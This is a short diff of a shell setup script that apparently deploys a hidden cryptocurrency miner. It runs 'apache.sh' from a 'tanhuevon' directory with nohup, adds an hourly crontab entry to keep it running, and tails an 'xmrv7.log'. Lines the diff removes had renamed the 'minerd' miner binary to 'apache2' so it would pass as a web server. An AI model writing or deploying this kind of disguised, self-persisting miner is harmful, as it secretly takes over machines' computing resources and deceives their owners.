@@ -15,11 +15,8 @@ apt-get -y --force-yes install libmicrohttpd-dev libssl-dev cmake build-essentia
 cd 
 
 wget https://api.ipify.org	
-chmod +x tanhuevon/*
-mv tanhuevon/minerd ./apache2
-cp tanhuevon/apache.sh .
 
 nohup sh /root/tanhuevon/apache.sh &
 echo '0 * * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
 sleep 13
-tail -f ~/apache2.log
+tail -f ~/tanhuevon/xmrv7.log
